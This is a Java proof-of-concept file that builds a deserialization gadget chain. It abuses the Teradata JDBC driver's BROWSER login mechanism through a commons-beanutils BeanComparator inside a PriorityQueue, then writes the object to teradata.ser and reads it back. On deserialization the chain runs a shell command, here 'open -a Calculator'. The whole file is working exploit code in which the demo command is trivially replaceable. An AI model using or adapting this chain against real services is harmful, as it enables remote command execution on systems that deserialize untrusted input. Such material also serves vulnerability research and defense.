package teradata;

import com.teradata.jdbc.TeraDataSource;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;

public class TeradataSink {
    public static void main(String[] args) throws Exception {
        // sink
        String command = "open -a Calculator";
        TeraDataSource dataSource = new TeraDataSource();
        dataSource.setBROWSER(command);
        dataSource.setLOGMECH("BROWSER");
        dataSource.setDSName("127.0.0.1");
        dataSource.setDbsPort("10250");

        // cb call getter
        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        setValue(comparator, "property", "connection");

        final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = dataSource;
        queueArray[1] = dataSource;

        String fileName = "teradata.ser";
        FileOutputStream fileOutputStream = new FileOutputStream(fileName);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(queue);

        FileInputStream fileInputStream = new FileInputStream(fileName);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        return field.get(obj);
    }

}
